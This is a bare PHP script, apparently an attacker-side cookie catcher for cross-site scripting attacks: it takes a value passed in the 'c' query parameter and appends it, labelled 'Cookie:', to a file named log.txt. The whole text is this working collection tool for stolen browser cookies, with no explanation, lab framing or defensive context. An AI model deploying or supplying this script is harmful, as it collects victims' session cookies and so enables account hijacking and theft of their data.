<?php
$cookie = $_GET['c'];
$fp = fopen('log.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie.'\r\n');
fclose($fp);

?>
